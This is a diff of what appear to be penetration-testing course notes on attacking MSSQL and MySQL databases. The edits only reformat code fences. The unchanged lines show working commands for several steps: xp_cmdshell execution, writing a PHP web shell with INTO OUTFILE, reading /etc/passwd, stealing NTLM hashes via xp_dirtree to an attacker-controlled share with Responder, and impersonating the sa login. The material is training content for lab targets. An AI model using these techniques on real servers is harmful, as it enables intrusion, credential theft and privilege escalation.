@@ -14,8 +14,7 @@ By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306
 
 #### Banner Grabbing
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125
 
 Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
@@ -103,8 +102,7 @@ Let's imagine we gained access to a SQL Database. First, we need to identify exi
 
 #### MySQL - Connecting to the SQL Server
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
 
 Welcome to the MariaDB monitor. Commands end with ; or \g.
@@ -120,8 +118,7 @@ MySQL [(none)]>
 
 #### Sqlcmd - Connecting to the SQL Server
 
-```
-        cmd
+```bat
 C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
 
 1>
@@ -131,8 +128,7 @@ C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
 
 If we are targetting `MSSQL` from Linux, we can use `sqsh` as an alternative to `sqlcmd`:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
 
 sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
@@ -144,8 +140,7 @@ For more information type '\warranty'
 
 Alternatively, we can use the tool from Impacket with the name `mssqlclient.py`.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -167,8 +162,7 @@ SQL>
 
 When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`. The full command would look like:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
 
 sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
@@ -203,8 +197,7 @@ Before we explore using SQL syntax, it is essential to know the default database
 
 #### Show Databases
 
-```
-        shellsession
+```shellsession
 mysql> SHOW DATABASES;
 
 +--------------------+
@@ -218,8 +211,7 @@ mysql> SHOW DATABASES;
 
 If we use `sqlcmd`, we will need to use `GO` after our query to execute the SQL syntax.
 
-```
-        cmd
+```bat
 1> SELECT name FROM master.dbo.sysdatabases
 2> GO
 
@@ -234,15 +226,13 @@ htbusers
 
 #### Select a Database
 
-```
-        shellsession
+```shellsession
 mysql> USE htbusers;
 
 Database changed
 ```
 
-```
-        cmd
+```bat
 1> USE htbusers
 2> GO
 
@@ -251,8 +241,7 @@ Changed database context to 'htbusers'.
 
 #### Show Tables
 
-```
-        shellsession
+```shellsession
 mysql> SHOW TABLES;
 
 +----------------------------+
@@ -270,8 +259,7 @@ mysql> SHOW TABLES;
 8 rows in set (0.00 sec)
 ```
 
-```
-        cmd
+```bat
 1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
 2> GO
 
@@ -290,8 +278,7 @@ users
 
 #### Select all Data from Table "users"
 
-```
-        shellsession
+```shellsession
 mysql> SELECT * FROM users;
 
 +----+---------------+------------+---------------------+
@@ -305,8 +292,7 @@ mysql> SELECT * FROM users;
 4 rows in set (0.00 sec)
 ```
 
-```
-        cmd
+```bat
 1> SELECT * FROM users
 2> go
 
@@ -336,8 +322,7 @@ To execute commands using SQL syntax on MSSQL, use:
 
 #### XP\_CMDSHELL
 
-```
-        cmd
+```bat
 1> xp_cmdshell 'whoami'
 2> GO
 
@@ -381,8 +366,7 @@ There are other methods to get command execution, such as adding [extended store
 
 #### MySQL - Write Local File
 
-```
-        shellsession
+```shellsession
 mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
 
 Query OK, 1 row affected (0.001 sec)
@@ -400,8 +384,7 @@ In the following example, we can see the `secure_file_priv` variable is empty, w
 
 #### MySQL - Secure File Privileges
 
-```
-        shellsession
+```shellsession
 mysql> show variables like "secure_file_priv";
 
 +------------------+-------+
@@ -417,8 +400,7 @@ To write files using `MSSQL`, we need to enable [Ole Automation Procedures](http
 
 #### MSSQL - Enable Ole Automation Procedures
 
-```
-        cmd
+```bat
 1> sp_configure 'show advanced options', 1
 2> GO
 3> RECONFIGURE
@@ -431,8 +413,7 @@ To write files using `MSSQL`, we need to enable [Ole Automation Procedures](http
 
 #### MSSQL - Create a File
 
-```
-        cmd
+```bat
 1> DECLARE @OLE INT
 2> DECLARE @FileID INT
 3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
@@ -451,8 +432,7 @@ By default, `MSSQL` allows file read on any file in the operating system to whic
 
 #### Read Local Files in MSSQL
 
-```
-        cmd
+```bat
 1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
 2> GO
 
@@ -473,8 +453,7 @@ As we previously mentioned, by default a `MySQL` installation does not allow arb
 
 #### MySQL - Read Local Files in MySQL
 
-```
-        shellsession
+```shellsession
 mysql> select LOAD_FILE("/etc/passwd");
 
 +--------------------------+
@@ -499,8 +478,7 @@ To make this work, we need first to start [Responder](https://github.com/lgandx/
 
 #### XP\_DIRTREE Hash Stealing
 
-```
-        cmd
+```bat
 1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
 2> GO
 
@@ -510,8 +488,7 @@ subdirectory    depth
 
 #### XP\_SUBDIRS Hash Stealing
 
-```
-        cmd
+```bat
 1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
 2> GO
 
@@ -523,8 +500,7 @@ If the service account has access to our server, we will obtain its hash. We can
 
 #### XP\_SUBDIRS Hash Stealing with Responder
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo responder -I tun0
 
                                          __               
@@ -543,8 +519,7 @@ hiimeins@htb[/htb]$ sudo responder -I tun0
 
 #### XP\_SUBDIRS Hash Stealing with impacket
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -572,8 +547,7 @@ First, we need to identify users that we can impersonate. Sysadmins can imperson
 
 #### Identify Users that We Can Impersonate
 
-```
-        cmd
+```bat
 1> SELECT distinct b.name
 2> FROM sys.server_permissions a
 3> INNER JOIN sys.server_principals b
@@ -594,8 +568,7 @@ To get an idea of privilege escalation possibilities, let's verify if our curren
 
 #### Verifying our Current User and Role
 
-```
-        cmd
+```bat
 1> SELECT SYSTEM_USER
 2> SELECT IS_SRVROLEMEMBER('sysadmin')
 3> go
@@ -615,8 +588,7 @@ As the returned value `0` indicates, we do not have the sysadmin role, but we ca
 
 #### Impersonating the SA User
 
-```
-        cmd
+```bat
 1> EXECUTE AS LOGIN = 'sa'
 2> SELECT SYSTEM_USER
 3> SELECT IS_SRVROLEMEMBER('sysadmin')
@@ -649,8 +621,7 @@ If we manage to gain access to a SQL Server with a linked server configured, we 
 
 #### Identify linked Servers in MSSQL
 
-```
-        cmd
+```bat
 1> SELECT srvname, isremote FROM sysservers
 2> GO
 
@@ -666,8 +637,7 @@ As we can see in the query's output, we have the name of the server and the colu
 
 Next, we can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).
 
-```
-        cmd
+```bat
 1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
 2> GO
 
